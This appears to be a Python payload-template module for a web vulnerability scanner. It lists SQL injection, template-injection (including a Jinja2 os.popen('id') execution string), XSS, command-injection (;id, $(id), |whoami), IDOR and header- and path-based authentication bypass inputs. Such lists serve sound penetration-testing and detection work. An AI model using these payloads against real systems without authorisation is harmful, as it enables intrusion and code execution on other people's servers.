"""Payload模板库"""

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "' UNION SELECT NULL--",
    "1; WAITFOR DELAY '0:0:3'--",
    "1' AND SLEEP(3)--",
    "' AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--",
]

SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "{{7*'7'}}",
    "<%= 7*7 %>",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
]

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    "'-alert(1)-'",
]

IDOR_OFFSETS = [1, -1, 0, 100, 999, 10000]

AUTH_BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
]

PATH_BYPASS_SUFFIXES = [
    "/", ";.js", "%20", ".", "..;/", "%2e/",
]

CMD_INJECTION_PAYLOADS = [
    ";id", "|id", "$(id)", "`id`",
    ";whoami", "|whoami",
    "& ping -c 1 127.0.0.1 &",
]
